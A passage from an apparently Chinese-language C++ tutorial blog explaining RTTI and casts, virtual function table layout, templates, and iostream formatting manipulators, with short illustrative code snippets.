class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span>:</span><span class="keyword">public</span> Shape&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  Circle(<span class="keyword">int</span> x, <span class="keyword">int</span> y,<span class="keyword">int</span> r):Shape(x,y),_r(r)&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;draw Circle &quot;</span>;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;start (&quot;</span>&lt;&lt;_x&lt;&lt;<span class="string">&quot;,&quot;</span>&lt;&lt;_y&lt;&lt;<span class="string">&quot;) &quot;</span>;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;radio r = &quot;</span>&lt;&lt;_r&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line"><span class="keyword">private</span>:<span class="keyword">int</span> _r;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//-----------------------</span></span><br><span class="line">Shape *s = <span class="keyword">new</span> Circle(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">s.Show()</span><br><span class="line"><span class="keyword">delete</span> s;  <span class="comment">// 首先析构Cricle，再析构Shape，完成完整析构。</span></span><br></pre></td></tr></table></figure><h3 id="运行时类型信息rtti"><a class="markdownIt-Anchor" href="#运行时类型信息rtti"></a> 运行时类型信息(RTTI)</h3><ul><li>typeid、dynamic_cast是C++运行时类型信息RTTI(run time type identificaiton)重要组成部分。运行时信息，来自于多态，所以只用于基于多态的继承体系中。</li></ul><h4 id="typeid"><a class="markdownIt-Anchor" href="#typeid"></a> typeid</h4><ul><li>运算符 typeid 返回包含操作数数据类型信息的 type_info 对象的一个引用，信息中包括数据类型的名称，要使用 typeid,程序中需要包含头文件<code>&lt;typeinfo&gt;</code>。</li><li>其中 type_info 重载了操作符==, !=,分别用来比较是否相等、不等，函数 name()返回类型名称。type_info 的拷贝和赋值均是私有的，故不可拷贝和赋值。</li><li>常用于返回检查,调试之用。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*Func)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span>&#123;</span><span class="keyword">public</span>:<span class="keyword">virtual</span> ~Base()&#123;&#125;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derive</span>:</span><span class="keyword">public</span> Base&#123;&#125;;</span><br><span class="line"><span class="comment">//------------------------</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(<span class="keyword">int</span>).name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(<span class="keyword">double</span>).name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(<span class="keyword">char</span> *).name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(<span class="keyword">char</span> **).name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(<span class="keyword">const</span> <span class="keyword">char</span> *).name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(<span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">const</span> ).name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(Func).name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(Base).name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(Derive).name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">Derive d;</span><br><span class="line">Base &amp;b = d; <span class="comment">//Base 中没有虚函数时，有时？</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(b).name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(d).name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">Base *p = &amp;d;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(p).name()&lt;&lt;<span class="built_in">endl</span>; <span class="comment">//判断指针是，其实是看不出其类型信息的</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(*p).name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="keyword">typeid</span>(d).name()&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;boolalpha&lt;&lt;(<span class="keyword">typeid</span>(*p)== <span class="keyword">typeid</span>(d))&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><ul><li>多态下使用 typeid 时要注意的问题:<ol><li>确保基类定义了至少一个虚函数(虚析构也算)。</li><li>不要将 typeid 作用于指针，应该作用于引用，或解引用的指针。</li><li>typeid 是一个运算符，而不是函数。</li><li>typeid 运算符返回的 type_info 类型，其拷贝构造函数和赋值运算函数都声明为private 了，这意味着其不能用于 stl 容器，所以我们一般不能不直接保存 type_info 信息，而保存 type_info 的 name 信息</li></ol></li></ul><h4 id="typecast"><a class="markdownIt-Anchor" href="#typecast"></a> typecast</h4><h5 id="static_cast"><a class="markdownIt-Anchor" href="#static_cast"></a> static_cast</h5><ul><li>在一个方向上可以作隐式转换的，在另外一个方向上可以作静态转换。发生在编译阶段，不保证后序使用的正确性。</li></ul><h5 id="reinterpreter_cast"><a class="markdownIt-Anchor" href="#reinterpreter_cast"></a> reinterpreter_cast</h5><ul><li>既不在编译器期也不在运行期进行检查，安全性完全由程序员决定。</li></ul><h5 id="dynamic_cast"><a class="markdownIt-Anchor" href="#dynamic_cast"></a> dynamic_cast</h5><ul><li>dynamic_cast 一种运行时的类型转化方式,所以要在运行时作转换判断。检查指针所指类型，然后判断这一类型是否与正在转换成的类型有一种 “is a”的关系，如果是，dynamic_cast 返回对象地址。如果不是，dynamic_cast 返回 NULL。</li><li>dynamic_cast 常用多态继承中，判断父类指针的真实指向。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span><span class="keyword">public</span>:<span class="keyword">virtual</span> ~A()&#123;&#125;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">public</span> A &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span><span class="keyword">public</span> A &#123;&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> &#123;</span>&#125;;</span><br><span class="line"><span class="comment">//-----------------------</span></span><br><span class="line">B b;</span><br><span class="line">A *pa = &amp;b;</span><br><span class="line">B *pb = <span class="keyword">dynamic_cast</span>&lt;B*&gt;(pa); <span class="comment">//成功</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;pb&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">C *pc = <span class="keyword">dynamic_cast</span>&lt;C*&gt;(pa); <span class="comment">//成功 安全</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;pc&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">D *pd = <span class="keyword">dynamic_cast</span>&lt;D*&gt;(pa); <span class="comment">//成功 安全</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;pd&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">pb = <span class="keyword">static_cast</span>&lt;B*&gt;(pa); <span class="comment">//成功</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;pb&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">pc = <span class="keyword">static_cast</span>&lt;C*&gt;(pa); <span class="comment">//成功 不安全</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;pc&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">// pd = static_cast&lt;D*&gt;(pa); //编译 不成功</span></span><br><span class="line"><span class="comment">// cout&lt;&lt;pd&lt;&lt;endl;</span></span><br><span class="line">pb = <span class="keyword">reinterpret_cast</span>&lt;B*&gt;(pa); <span class="comment">//成功 不安全</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;pb&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">pc = <span class="keyword">reinterpret_cast</span>&lt;C*&gt;(pa); <span class="comment">//成功 不安全</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;pc&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">pd = <span class="keyword">reinterpret_cast</span>&lt;D*&gt;(pa); <span class="comment">//成功 不安全</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;pd&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><h3 id="多态实现原理"><a class="markdownIt-Anchor" href="#多态实现原理"></a> 多态实现原理</h3><h4 id="虚函数表"><a class="markdownIt-Anchor" href="#虚函数表"></a> 虚函数表</h4><ul><li>C++的多态是通过一张虚函数表（Virtual Table）来实现的，简称为 V-Table。在这个表中，主是要一个类的虚函数的地址表，这张表解决了继承、覆写的问题，保证其真实反应实际的函数。</li><li>这样，在有虚函数的类的实例中这个表被分配在了这个实例的内存中，所以，当我们用父类的指针来操作一个子类的时候，这张虚函数表就显得由为重要了，它就像一个地图一样，指明了实际所应该调用的函数。</li><li>虚函数表是在构造函数中生成的，所以构造函数不能为虚函数。同时，子类构造时，由于先进行主类构造，构造调用子类重写的虚函数是不成功的，因为虚函数表没有生成，所以就近调用自己的函数。还有析构时，子类优先析构，主类调用时也无法获得虚函数表，也会就近调用自己的虚函数。</li><li>这里我们着重看一下这张虚函数表。C++的编译器应该是保证虚函数表的指针存在于对象实例中<strong>最前面的位置</strong>（这是为了保证取到虚函数表的有最高的性能——如果有多层继承或是多重继承的情况下）。 这意味着我们通过对象实例的地址得到这张虚函数表，然后就可以遍历其中函数指针，并调用相应的函数。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::f&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::g&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::h&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//------------获取虚函数表--------------</span></span><br><span class="line">Base b;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;&amp;b&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;基类 b 的起始地址:&quot;</span>&lt;&lt;(<span class="keyword">int</span>*)(&amp;b)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;VTalbe 的起始地址:&quot;</span>&lt;&lt;(<span class="keyword">int</span>**)(<span class="keyword">int</span>*)(&amp;b)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">FUNC pf = <span class="literal">NULL</span>;</span><br><span class="line">pf = (FUNC)*((<span class="keyword">int</span>**)*(<span class="keyword">int</span>*)(&amp;b)+<span class="number">0</span>);</span><br><span class="line">pf();</span><br><span class="line">pf = (FUNC)*((<span class="keyword">int</span>**)*(<span class="keyword">int</span>*)(&amp;b)+<span class="number">1</span>);</span><br><span class="line">pf();</span><br><span class="line">pf = (FUNC)*((<span class="keyword">int</span>**)*(<span class="keyword">int</span>*)(&amp;b)+<span class="number">2</span>);</span><br><span class="line">pf();</span><br><span class="line">&gt;&gt;&gt; <span class="number">4</span></span><br><span class="line">&gt;&gt;&gt; 基类 b 的起始地址:<span class="number">0x28fea8</span></span><br><span class="line">&gt;&gt;&gt; VTalbe 的起始地址:<span class="number">0x28fea8</span></span><br><span class="line">&gt;&gt;&gt; Base::f</span><br><span class="line">&gt;&gt;&gt; Base::g</span><br><span class="line">&gt;&gt;&gt; Base::h</span><br></pre></td></tr></table></figure><ul><li>通过这个示例，我们可以看到，我们可以通过强行把&amp;b 转成 <code>int *</code>，取得虚函数表的地址，然后，再次取址就可以得到第一个虚函数的地址了，也就是 Base::f()，这在上面的程序中得到了验证（把 int* 强制转成了函数指针）。通过这个示例，我们就可以知道如果要调用Base::g()和 Base::h()，其代码如下：</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(Fun)*((<span class="keyword">int</span>**)*(<span class="keyword">int</span>*)(&amp;b)+<span class="number">0</span>); <span class="comment">// Base::f()</span></span><br><span class="line">(Fun)*((<span class="keyword">int</span>**)*(<span class="keyword">int</span>*)(&amp;b)+<span class="number">1</span>); <span class="comment">// Base::g()</span></span><br><span class="line">(Fun)*((<span class="keyword">int</span>**)*(<span class="keyword">int</span>*)(&amp;b)+<span class="number">2</span>); <span class="comment">// Base::h()</span></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-53.png" alt="虚函数表" /></p><ul><li>在对象首地址指向的虚函数表的最后有一个结点，这是虚函数表的结束结点，就像字符串的结束符“/0”一样，其标志了虚函数表的结束。这个结束标志的值在不同的编译器下是不同的。</li></ul><h4 id="无虚函数覆写继承"><a class="markdownIt-Anchor" href="#无虚函数覆写继承"></a> 无虚函数覆写继承</h4><ul><li>假设有下面父类和子类，在这个继承关系中，子类没有重载任何父类的函数。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::f&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::g&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::h&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Drive</span> :</span><span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Drive::f1&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Drive::g1&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Drive::h1&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-54.png" alt="虚函数表" /></p><ul><li>则派生类的实例中，其虚函数表如下所示<ol><li>虚函数按照其声明顺序放于表中。</li><li>父类的虚函数在子类的虚函数前面</li></ol></li></ul><h4 id="有虚函数覆写继承"><a class="markdownIt-Anchor" href="#有虚函数覆写继承"></a> 有虚函数覆写继承</h4><ul><li>在这个继承关系中，子类覆盖了父类的一个函数：f()。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::f&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::g&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Base::h&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Drive</span> :</span><span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Drive::f&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Drive::g1&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h1</span><span class="params">()</span> </span>&#123; <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Drive::h1&quot;</span> &lt;&lt; <span class="built_in">endl</span>; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-55.png" alt="虚函数表" /></p><ul><li>可以看出<ol><li>覆写的 f()函数被放到了虚表中原来父类虚函数的位置。</li><li>没有被覆盖的函数依旧。</li></ol></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Base *b = <span class="keyword">new</span> Derive();</span><br><span class="line">b-&gt;f();</span><br></pre></td></tr></table></figure><ul><li>由 b 所指的内存中的虚函数表的 f()的位置已经被 Derive::f()函数地址所取代，于是在实际调用发生时，是 Derive::f()被调用了。这就实现了多态。</li><li>静态代码执行过程：当编译器看到这段代码的时候，并不知道 b 真实身份。编译器能作的就是用一段代码代替这段语句。<ol><li>明确 b 类型。</li><li>然后通过指针虚函数表的指针 vptr 和偏移量,匹配虚函数的入口。</li><li>根据入口地址调用虚函数。</li></ol></li></ul><h1 id="c高级"><a class="markdownIt-Anchor" href="#c高级"></a> <code>C++</code>高级</h1><h2 id="模板templates"><a class="markdownIt-Anchor" href="#模板templates"></a> 模板(Templates)</h2><ul><li>泛型(Generic Programming)即是指具有在多种数据类型上皆可操作的含意。泛型编程的代表作品 STL 是一种高效、泛型、可交互操作的软件组件。</li><li>泛型编程最初诞生于 <code>C++</code>中，目的是为了实现 <code>C++</code>的 STL（标准模板库）。其语言支持机制就是模板（Templates）。模板的精神其实很简单：参数化类型。换句话说，把一个原本特定于某个类型的算法或类当中的类型信息抽掉，抽出来做成模板参数 T。</li></ul><h3 id="函数模板"><a class="markdownIt-Anchor" href="#函数模板"></a> 函数模板</h3><h4 id="函数重载实现的泛型"><a class="markdownIt-Anchor" href="#函数重载实现的泛型"></a> 函数重载实现的泛型</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>&amp; a,<span class="keyword">int</span>&amp; b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">double</span>&amp; a,<span class="keyword">double</span>&amp; b)</span></span>&#123;&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="函数模板的引入"><a class="markdownIt-Anchor" href="#函数模板的引入"></a> 函数模板的引入</h4><ul><li>函数模板，只适用于函数的参数个数相同而类型不同，且函数体相同的情况。如果个数不同，则不能用函数模板。</li><li>语法格式</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span>/<span class="class"><span class="keyword">class</span> 类型参数表&gt;</span></span><br><span class="line"><span class="class">返回类型 函数模板名(函数参数列表) &#123;</span></span><br><span class="line">函数模板定义体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>template 是语义是模板的意思，尖括号中先写关键字 typename 或是 class ，后面跟一个类型 T,此类即是虚拟的类型。至于为什么用 T,用的人多了，也就是 T 了。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(T&amp; a,T&amp; b)</span></span>&#123;&#125;<span class="comment">//函数模板，根据具体类型产生模板函数</span></span><br><span class="line">swap&lt;<span class="keyword">int</span>&gt;(<span class="number">1</span>,<span class="number">3</span>);     <span class="comment">//调用，&lt;int&gt;也可以省略</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span> T2&gt;  <span class="comment">//多个类型定义</span></span><br></pre></td></tr></table></figure><h3 id="类模板"><a class="markdownIt-Anchor" href="#类模板"></a> 类模板</h3><ul><li>由类模板，会生成对应的类，再生成类对象。</li><li>类模板语法</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//---------类模板定义</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span>&#123;</span>&#125;</span><br><span class="line"><span class="comment">//---------类内定义成员函数</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span>&#123;</span><span class="keyword">public</span>:Stack(<span class="keyword">int</span> size)&#123;space = <span class="keyword">new</span> T[size];top = <span class="number">0</span>;&#125; &#125;</span><br><span class="line"><span class="comment">//---------类外定义函数</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">void</span> Stack&lt;T&gt;::push(T data)&#123;space[top++] = data;&#125;</span><br><span class="line"><span class="comment">//---------类模板实例化为模板类</span></span><br><span class="line">类模板是类的抽象，类是类模板的实例。</span><br><span class="line"><span class="function">Stack&lt;<span class="keyword">double</span>&gt; <span class="title">s</span><span class="params">(<span class="number">100</span>)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="io-流"><a class="markdownIt-Anchor" href="#io-流"></a> IO 流</h2><ul><li>在<code>C++</code>中cin和cout充当了scanf和printf的功能。但他们并不是函数。而是类对象。</li></ul><p><img src="/images/pasted-56.png" alt="io 类关系" /></p><ul><li><strong>特点</strong></li><li>IO对象不可复制或赋值</li><li>IO对象是缓冲的，下面几种情况会导致刷缓冲<ol><li>程序正常结束，作为 main 函数结束的一部分，将清空所有缓冲区。</li><li>缓冲区满，则会刷缓冲。</li><li>endl, flush 也会刷缓冲。</li><li>在每次输出操作执行完后，用 unitbuf 操作符设置流的内部状态，从而清空缓冲区。</li></ol></li><li>重载了&lt;&lt; 和 &gt;&gt;运算符</li></ul><h3 id="输入输出-io-流"><a class="markdownIt-Anchor" href="#输入输出-io-流"></a> 输入输出 IO 流</h3><h4 id="标准输出"><a class="markdownIt-Anchor" href="#标准输出"></a> 标准输出</h4><ul><li>C++提供的输出流对象有：<ul><li>cout：输出基本类型数据时，不必考虑数据是什么类型，系统会自动判断，选择相应的重载函数；输出用户自己定义的类型数据时，要重载&lt;&lt;运算符。</li><li>cerr：是在屏幕上显示出错信息，与 cout 用法类似，不同的是只能在屏幕上，而不能在磁盘文件上输出错误信息；</li><li>clog：用法与 cerr 类似，不同点是它带有缓冲区。</li></ul></li></ul><h5 id="引用流算子iomanip"><a class="markdownIt-Anchor" href="#引用流算子iomanip"></a> 引用流算子iomanip</h5><ul><li>系统自带了一些格式化方法，不过设置很麻烦</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cout</span>.unsetf(ios::dec);   <span class="comment">//取消10进制</span></span><br><span class="line"><span class="built_in">cout</span>.setf(ios::hex);   <span class="comment">//16进制</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="number">1234</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>.unsetf(ios::hex);   <span class="comment">//取消16进制</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="number">1234</span>&lt;&lt;<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure><ul><li>引用流算子</li></ul><table><thead><tr><th>控制符</th><th>功能</th><th>举例</th></tr></thead><tbody><tr><td>dec<br>hex<br>oct</td><td>十进制数输出<br> 十六进制输出<br> 八进制数输出</td><td><code>cout&lt;&lt;&quot;十进制 :&quot;&lt;&lt;n&lt;&lt;endl;</code><br><code>cout&lt;&lt;&quot;十六进制:&quot;&lt;&lt;hex&lt;&lt;n&lt;&lt;endl;</code><br><code>cout&lt;&lt;&quot;八进制 :&quot;&lt;&lt;oct&lt;&lt;n&lt;&lt;endl;</code></td></tr><tr><td>setfill©</td><td>在给定的输出域宽度内填充字符 c，需要与 setw(n)合用</td><td><code>cout&lt;&lt;setfill('*')&lt;&lt;setw(5)&lt;&lt;x&lt;&lt;endl;</code></td></tr><tr><td>setprecison(n)</td><td>设显示小数精度为 n 位，自动四舍五入</td><td><code>cout&lt;&lt;setprecision(2)&lt;&lt;dd&lt;&lt;endl;</code></td></tr><tr><td>setw(n)</td><td>设域宽为 n 个字符</td><td><code>cout&lt;&lt;setw(10)&lt;&lt;m&lt;&lt;endl;</code></td></tr><tr><td>setiosflags(ios::fixed)</td><td>固定的浮点显示，此时精度域表示小数位数</td><td><code>cout&lt;&lt;setiosflags(ios::fixed)&lt;&lt;dd&lt;&lt;endl;</code></td></tr><tr><td>setiosflags(ios::scientific)</td><td>指数显示，科学记数法，此时精度域表示小数位数</td><td><code>cout&lt;&lt;setiosflags(ios::scientific)&lt;&lt;dd&lt;&lt;endl;</code></td></tr><tr><td>setiosflags(ios::left)</td><td>左对齐</td><td><code>cout&lt;&lt;setiosflags(ios::left)&lt;&lt;setw(10)&lt;&lt;y&lt;&lt;endl;</code></td></tr><tr><td>setiosflags(ios::right)</td><td>右对齐</td><td></td></tr><tr><td>setiosflags(ios::showpoint)</td><td>强制显示小数点和尾</td><td><code>cout&lt;&lt;setiosflags(ios::showpoint)&lt;&lt;d1&lt;&lt;endl;</code></td></tr><tr><td>setiosflags(ios::showpos)</td><td>强制显示符号</td><td><code>cout&lt;&lt;setiosflags(ios::showpos)&lt;&lt;d2&lt;&lt;endl;</code></td></tr><tr><td>setiosflags(ios::skipws)</td><td>忽略前导空白</td><td></td></tr><tr><td>setiosflags(ios::uppercase)</td><td>十六进制数大写输出</td><td><code>cout&lt;&lt;&quot;以大写方式输出进制数: &quot;&lt;&lt;setiosflags(ios::uppercase)&lt;&lt;hex&lt;&lt;num&lt;&lt;endl;</code></td></tr><tr><td>setiosflags(ios::lowercase)</td><td>十六进制数小写输出</td><td><code>cout&lt;&lt;&quot;16 进制数(默认：小写方式):&quot;&lt;&lt;hex&lt;&lt;num&lt;&lt;endl;</code></td></tr><tr><td>setiosflags(ios::showbase)</td><td>当按十六进制输出数据时，前面显示前导符 0x；当按八进制输出数据时，前面显示前导符 0</td><td></td></tr><tr><td>endl</td><td>输入一个换行符并刷新流</td><td></td></tr><tr><td>resetiosflags</td><td></td><td></td></tr></tbody></table><h4 id="标准输入-cin"><a class="markdownIt-Anchor" href="#标准输入-cin"></a> 标准输入 cin</h4><ul><li>在 C++中，默认的标准输入设备是键盘，在 iostream 文件中定义了 cin 输入流对象。</li><li>cin 对象与提取运算符&gt;&gt;、变量名或数组名一起构成输入语句，形式为 C++的格式化输入。</li><li>cin&gt;&gt;…&gt;&gt;…&gt;&gt;…；，能够连续输入多项内容。只要是基本数据类型，不管是 int、double、float，还是 <code>char</code>、<code>char 